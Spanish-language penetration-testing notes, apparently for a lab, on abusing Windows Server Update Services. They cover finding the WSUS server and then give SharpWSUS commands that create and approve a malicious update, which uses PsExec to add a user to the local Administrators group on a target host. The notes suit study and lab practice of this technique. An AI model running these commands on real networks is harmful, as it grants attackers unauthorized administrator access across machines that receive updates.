# Info

Permite a los admins distribuir updates y parches para los productos de microsoft de manera remota dentro de una red.

# Permisos requeridos (uno u otro)

- Privilgios administrativos en el server WSUS.
- Un user del Administrator group
- Un user del WSUS administrator group

# Enumeración

## Encontrar el server WSUS

### Desde el registro

Podemos preguntar qué host es el server de WSUS desde el registro:

    reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

### SharpWSUS

    .\SharpWSUS.exe locate

## Enumeración en el server:

    .\SharpWSUS.exe inspect


# Movimiento Lateral

### Con SharpWSUS

- Podemos aprovechar este servicio para crear un parche que nos genere una conexión remota permitiendonos ejecutar código en un host.

Para esto podemos usar SharpWSUS

WSUS solo puede ejecutar binarios firmados por Microsoft. PSExec de la Sysinternals está firmado por windows, podemos usarlo.

##### 1) Creamos el parche malicioso

Este parche agrega a un user al grupo de administrador

    .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"NewAccountUpdate"


##### 2) Vamos a la solapa security updates dentro de Windows Server update service
##### 3) Extraemos el Update ID de nuestro parche
##### 4) Lo adjudicamos a un equipo

    .\SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.inlanefreight.local /groupname:"FastUpdates"

